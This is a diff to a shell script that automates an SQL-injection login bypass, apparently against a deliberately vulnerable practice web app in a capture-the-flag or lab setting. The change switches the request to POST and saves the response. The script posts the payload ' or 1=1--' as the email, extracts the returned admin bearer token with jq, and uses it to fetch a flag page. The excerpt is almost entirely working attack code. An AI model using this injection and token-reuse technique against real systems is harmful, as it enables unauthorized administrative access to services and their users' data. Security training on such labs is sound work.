@@ -18,7 +18,7 @@ echo "--> Session initiated"
 
 # Authenticate using SQL injection session
 echo "2 - AUTHENTICATE THROUGH INJECTION"
-curl -s -X GET "http://$target_ip/rest/user/login" -b "/work/1-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"' or 1=1--'\",\"password\":\"a\"}"
+curl -s -X POST "http://$target_ip/rest/user/login" -b "/work/1-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"' or 1=1--'\",\"password\":\"a\"}" -o /work/1-admin.json
 TOKEN=$(jq -r '.authentication.token' /work/1-admin.json)
 echo "--> Authenticated with token ${TOKEN}"
 curl -s -X GET "http://$target_ip/" -b "/work/1-cookies.txt" -v -L -H "Authorization: Bearer ${TOKEN}" -o /work/1-flag.html
